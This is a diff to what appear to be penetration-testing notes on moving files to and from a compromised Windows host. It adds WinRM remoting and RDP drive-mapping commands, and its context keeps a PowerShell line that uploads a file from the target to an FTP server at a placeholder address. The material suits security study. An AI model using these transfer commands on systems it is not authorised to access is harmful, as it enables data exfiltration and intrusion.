@@ -155,3 +155,33 @@ We can then download it via PowerShell on the target
 ```PowerShell
 (New-Object Net.WebClient).UploadFile('ftp://<IP>/file.txt', '<Input File Location>')
 ```
+
+## PowerShell Remoting
+Sometimes HTTP, HTTPS, or SMB are unavailable, so we can use WinRM to perform file transfer. It allows us to execute scripts or commands remotely using PowerShell sessions.
+
+By default it uses:
+- HTTP : 5985/tcp
+- HTTPS : 5986/tcp
+
+You need to:
+- Be an administrator
+- Be a member of `Remote Management Users` group or have PowerShell Remoting permissions
+
+```PowerShell
+# Test Connection
+Test-NetConnection -ComputerName <NAME> -Port 5985
+
+# Create session to remote computer
+$Session = New-PSSession -ComputerName <Remote Name>
+
+# Copy a file to remote
+Copy-Item -Path <local path> -ToSession $Session -Destination <remote path>
+
+# Copy a file from remote
+Copy-Item -Path <remote path> -Destination <local path> -FromSession $Session
+```
+## Using RDP
+You can mount a drive as part of RDP
+```bash
+xfreerdp /v:10.10.10.132 /d:<domain> /u:<user> /p:<password> /drive:<local path>,<remote path>
+```
